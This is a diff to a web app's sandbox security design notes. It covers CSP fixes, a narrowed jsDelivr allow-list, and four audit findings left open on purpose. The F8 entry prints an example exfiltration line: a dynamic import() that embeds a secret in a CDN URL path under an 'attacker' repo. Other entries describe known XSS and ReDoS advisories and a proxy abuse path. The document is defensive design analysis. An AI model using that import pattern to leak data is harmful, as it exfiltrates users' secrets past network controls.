@@ -85,6 +85,17 @@ exists, with symptoms that read as a broken card rather than a wrong policy. It 
 remains the one that counts**, because a page cannot be relied on to police its
 own fetches, and the two are not equivalent.
 
+> **Addition, 2026-09-11 (F10).** `framePolicy` now also emits `base-uri
+> 'none'`. `base-uri` is one of the handful of directives with **no fallback to
+> `default-src`**, so the frame's `default-src 'none'` left it open and a card
+> could write `<base href="https://…">` and re-point every relative URL in its
+> own document. Measured harmless as the corpus stands — the frame's own URLs
+> are absolute, and `script-src` would refuse code from a re-pointed origin
+> anyway — so this closes a door nothing currently walks through, which is the
+> cheapest kind of door to close. It costs the frames nothing: the same
+> directive arrives from the shell's policy as well, since a `srcdoc` document
+> inherits its embedder's (see `notes/apps/iris-web/DEVIATIONS.md` §93).
+
 ## `parent.*` — what cards actually reach for
 
 | Access | Sites | Disposition |
@@ -611,8 +622,9 @@ frames — reopens this decision before it reopens anything else.
 Card scripts import from CDNs. Whitelist, enforced host-side:
 
 ```
-*.jsdelivr.net        (any hostname — measured: 14 of 15 real imports use
-                       testingcf.jsdelivr.net, only 1 uses cdn.)
+*.jsdelivr.net        (any hostname *under* it — not the bare apex; measured
+                       2026-09-11: 43 testingcf.jsdelivr.net, 13
+                       cdn.jsdelivr.net, 0 jsdelivr.net)
 raw.githubusercontent.com
 ```
 
@@ -623,6 +635,24 @@ a message naming the host**, never silently allowed and never silently dropped.
 The frame's own `script-src` carries the same list. That is a second layer, not
 a second enforcement point — if the two ever disagree, the host's answer is the
 real one.
+
+> **Correction, 2026-09-11 (F10).** This block used to read "*.jsdelivr.net (any
+> hostname …)", and `checkScriptFetch` implemented exactly that: it accepted the
+> bare `jsdelivr.net` as well as every subdomain. The CSP side never did —
+> `https://*.jsdelivr.net` does not match the apex per the source-expression
+> grammar — so for as long as both have existed the host has been one character
+> wider than the frame, in the direction where the host fetches and caches a
+> bundle the browser can never load and the card's failure names neither side.
+> Narrowed on the host rather than widened on the CSP side, because the corpus
+> asks for nothing: the apex appears **0** times across 1,888 card, interface,
+> preset and world-book bodies (19 cards, 6 presets, 18 books, read through the
+> census reader — a raw grep over the card PNGs answers zero for *everything*,
+> since the card JSON is base64 inside a `tEXt` chunk). The wider plaintext
+> sweep of the same install also names a fourth hostname the original "14 and 1"
+> reading did not, `fastly.jsdelivr.net` (2 mentions, in an extension's
+> changelog); the list covers it and always did. `raw.githubusercontent.com` is
+> untouched — it is an *exact* entry, so the apex comparison is its only branch,
+> which is why the fix gates that branch on `subdomains` instead of deleting it.
 
 ### Anything the frame imports must send CORS headers
 
@@ -795,6 +825,119 @@ bug, in the card's own error, three layers from the deployment that caused it.
 - `manifest.json` ceasing to gate `immutable`. Point 1's "a stale copy is
   correct" depends on the name/bytes coupling, and an unhashed name with a long
   TTL is the failure that coupling exists to prevent.
+
+## Accepted gaps — 已接受的缺口 (2026-09-11)
+
+Four findings from the 2026-09 security audits (`审计报告-网络安全工程.md`,
+`AUDIT-SYSTEM-SECURITY-DATA.md`) were read, reproduced against this code, and
+**left open on purpose**. They are here rather than in a tracker because a gap
+that lives only in a report is a gap the next person rediscovers and either
+panics about or closes at a cost nobody priced. Each entry says what is open,
+why it stays, and the observation that would reopen the decision. The full
+acceptance record, with the audit's own wording, is
+`notes/apps/iris-web/DEVIATIONS.md` §95.
+
+### F8 — the code allow-list is itself a narrow exfiltration channel, and a network grant does not close it
+
+**What is open.** The frame's `script-src` carries the two CDNs
+(`apps/iris-web/src/sandbox/srcdoc.ts:165`, `apps/iris-web/src/sandbox/policy.ts:77`)
+**unconditionally** — a card needs no network grant to load code, because
+without code it is not a card. A dynamic `import()` is a script fetch, and a
+script fetch's *URL* can carry data:
+`import('https://testingcf.jsdelivr.net/gh/attacker/repo@main/' + secret + '/x.js')`
+leaves the machine whether or not anything answers it. The 404 that comes back
+makes the import fail; the request has already happened, and the path is in
+somebody's log. So a card exfiltrates without touching any API the grant
+governs.
+
+**Why it stays.** Closing it means putting `script-src` inside the grant, and
+then a card loads no code until the user has answered a question they cannot
+evaluate — the answer is always yes, and a consent question whose only sane
+answer is yes teaches people to click through the next one too. Measured across
+the operator's install, 13 of 19 cards import MagVarUpdate from jsDelivr on
+first paint; gating that is not a hardening, it is a different product.
+
+**What the grant actually promises, restated.** The network grant governs
+`connect-src` and `img-src` — the channels a card uses to *talk* to a remote.
+It has never governed `script-src`, and the sentence in this document that
+implied "no grant, no way out" was reading the grant as a boundary rather than
+as what it is: the switch on the two channels a card would use for anything
+bulk or two-way. A path fragment on a code fetch is neither.
+
+**What would reopen it.** A measured card doing it — the shape is a dynamic
+`import()` whose specifier is built from a variable rather than written as a
+literal, which the corpus does not contain today and which a census can look
+for. Or a browser shipping a per-fetch policy that separates "load this module"
+from "reach this URL", which would make the narrow closure cheap. The middle
+option the audit named and this project has not built is a *report* rather than
+a refusal: notice the first non-literal import specifier in a frame and say so,
+which costs the ecosystem nothing.
+
+### L-5 — `showdown` 2.1.0 has a ReDoS and two XSS advisories, and there is no fixed release
+
+**What is open.** `apps/iris-web/package.json:37` pins `showdown` at `2.1.0`,
+which `npm audit` flags for a regular-expression denial of service and two
+cross-site scripting paths (metadata title, table header id). Upstream has
+published no fixed version.
+
+**Why it stays.** There is nowhere to move to, and the blast radius is one
+frame. `showdown` is handed to cards as a global inside the sandbox
+(`apps/iris-web/src/sandbox/preset-entry.ts:200`) because upstream's cards
+expect `new showdown.Converter()` to exist; the shell never renders its output,
+and the shell's own markdown path forbids raw HTML. A card that feeds hostile
+input to `showdown` achieves, inside a frame whose `default-src` is `'none'`
+and whose origin is opaque, exactly what that card could achieve by writing the
+script itself. The ReDoS hangs the frame that ran it.
+
+**What would reopen it.** A fixed release (then it is a version bump, not a
+decision). Or `showdown` output reaching the shell — if any shell-side code
+ever converts markdown through this library, the XSS advisories stop being
+frame-local and this entry is void.
+
+### F15 — the bundle proxy is a GET, so any local page can drive it
+
+**What is open.** `GET /iris/script-bundle?url=…` is a plain GET with no
+preflight, so any page in the user's browser — not only a card frame — can make
+this host fetch an allow-listed URL and write the body into the cache
+directory.
+
+**Why it stays.** It was priced before the audit arrived, in the module's own
+comment (`packages/iris-app-service/src/script-cache.ts:64-88`), and the audit
+agreed with the price: the reachable damage is bounded disk fill. The URL must
+pass `checkScriptFetch` on every request — https only, the two CDNs by suffix
+and exact match, re-checked on each of at most five redirect hops — so the
+target set is two public CDNs, not the local network. A single body is capped
+at 8 MiB and the directory at 256 MiB, and over budget the cache **refuses to
+write rather than evicting**, precisely so a hostile page cannot push a real
+dependency out. Requiring a preflight would mean requiring a header, and a
+`<script type="module" src>` cannot send one — the route exists to be loadable
+by a frame that way.
+
+**What would reopen it.** The allow-list admitting anything not a public CDN
+(then this is an SSRF surface, not a disk-fill one), or the budget changing from
+refuse-to-write to evict, which turns bounded fill into cache poisoning.
+
+### F17 — the stylesheet-link rewrite truncates on a `>` inside an attribute value
+
+**What is open.** `rewriteStylesheetLinks` matches tags with `/<link\b[^>]*>/gi`
+(`apps/iris-web/src/sandbox/srcdoc.ts:232-242`), and `[^>]*` stops at the first
+`>` — including one inside a quoted attribute value. Such a tag is not
+rewritten.
+
+**Why it stays.** It fails in the safe direction, and this is the reason the
+entry is short. A link that is not rewritten keeps its original remote href, and
+the frame's `style-src` does not admit remotes, so the browser refuses it and
+the existing reporter names the sheet. Nothing loads that would not have loaded;
+what is lost is the convenience the rewrite exists for. The alternative is a
+real attribute scanner in place of two regexes, and a hand-rolled HTML parser
+fails quietly in ways a regex does not — this repository has already taken that
+trade in the other direction once, deliberately, in `frontend-blocks.ts`.
+
+**What would reopen it.** A measured card whose stylesheet link carries a `>`
+inside an attribute — the corpus has none — or the rewrite ever being relied on
+for something other than convenience. If a future policy admitted remote styles
+and used the rewrite to *route* them, a missed rewrite would become a bypass
+instead of a refusal, and the scanner becomes worth its cost.
 
 ## Work split
 
